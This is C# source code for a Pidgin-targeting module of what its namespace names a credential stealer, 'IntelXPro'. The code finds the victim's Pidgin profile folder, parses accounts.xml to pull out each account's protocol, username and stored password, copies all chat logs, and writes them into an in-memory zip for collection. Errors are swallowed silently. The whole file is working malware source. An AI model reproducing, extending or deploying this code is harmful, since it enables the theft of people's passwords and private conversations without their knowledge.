using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Pidgin : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple");
            if (Directory.Exists(text))
            {
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Pidgin";
                CollectAccounts(zip, text, counterApplications);
                CollectLogs(zip, text, counterApplications);
                if (counterApplications.Files.Count > 0)
                {
                    counterApplications.Files.Add("Pidgin\\");
                    counter.Messangers.Add(counterApplications);
                }
            }
        }

        private void CollectLogs(InMemoryZip zip, string pidginRoot, Counter.CounterApplications counterApplications)
        {
            try
            {
                string text = Path.Combine(pidginRoot, "logs");
                if (Directory.Exists(text))
                {
                    string text2 = Path.Combine("Pidgin", "chatlogs");
                    zip.AddDirectoryFiles(text, text2);
                    counterApplications.Files.Add(text + " => " + text2);
                }
            }
            catch
            {
            }
        }

        private void CollectAccounts(InMemoryZip zip, string pidginRoot, Counter.CounterApplications counterApplications)
        {
            try
            {
                string text = Path.Combine(pidginRoot, "accounts.xml");
                if (!File.Exists(text))
                {
                    return;
                }
                StringBuilder stringBuilder = new StringBuilder();
                XmlDocument xmlDocument = new XmlDocument();
                using (XmlReader reader = XmlReader.Create(text, new XmlReaderSettings
                {
                    IgnoreComments = true,
                    IgnoreWhitespace = true
                }))
                {
                    xmlDocument.Load(reader);
                }
                XmlElement documentElement = xmlDocument.DocumentElement;
                if (documentElement == null)
                {
                    return;
                }
                foreach (XmlNode childNode in documentElement.ChildNodes)
                {
                    if (childNode.ChildNodes.Count >= 3)
                    {
                        XmlNode xmlNode2 = childNode.ChildNodes[0];
                        XmlNode xmlNode3 = childNode.ChildNodes[1];
                        XmlNode xmlNode4 = childNode.ChildNodes[2];
                        string text2 = xmlNode2?.InnerText;
                        string text3 = xmlNode3?.InnerText;
                        string text4 = xmlNode4?.InnerText;
                        if (!string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
                        {
                            stringBuilder.AppendLine("Protocol: " + text2);
                            stringBuilder.AppendLine("Username: " + text3);
                            stringBuilder.AppendLine("Password: " + text4);
                            stringBuilder.AppendLine();
                        }
                    }
                }
                if (stringBuilder.Length != 0)
                {
                    string text5 = Path.Combine("Pidgin", "accounts.txt");
                    zip.AddTextFile(text5, stringBuilder.ToString());
                    counterApplications.Files.Add(text + " => " + text5);
                }
            }
            catch
            {
            }
        }
    }
}
